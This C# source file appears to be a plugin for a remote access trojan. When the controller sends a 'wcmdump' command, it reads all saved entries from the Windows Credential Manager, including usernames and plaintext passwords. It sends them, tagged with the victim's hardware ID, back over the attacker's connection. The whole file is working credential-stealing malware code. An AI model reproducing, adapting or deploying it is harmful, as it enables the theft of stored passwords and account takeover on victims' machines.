using MessagePackLib.MessagePack;
using System;
using Plugin.Handler;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "wcmdump":
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Pac_ket").AsString = "wcmdump";
                            msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
                            msgpack.ForcePathObject("Output").AsString = Output();
                            Connection.Send(msgpack.Encode2Bytes());
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static string Output()
        {
            string Creds = "";
            var loadAll = Credential.LoadAll();
            foreach (var creds in loadAll)
            {
                Creds += "[*] Username: " + creds.Username + "\n[*] Password: " + creds.Password + "\n[*] Target: " + creds.Target + "\n[*] Description: " + creds.Description + "\n[*] LastWriteTime: " + creds.LastWriteTime + "\n[*] LastWriteTimeUtc: " + creds.LastWriteTimeUtc + "\n[*] Type: " + creds.Type + "\n[*] PersistenceType " + creds.PersistenceType + "\n";
            }
            return Creds;
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }

    }

}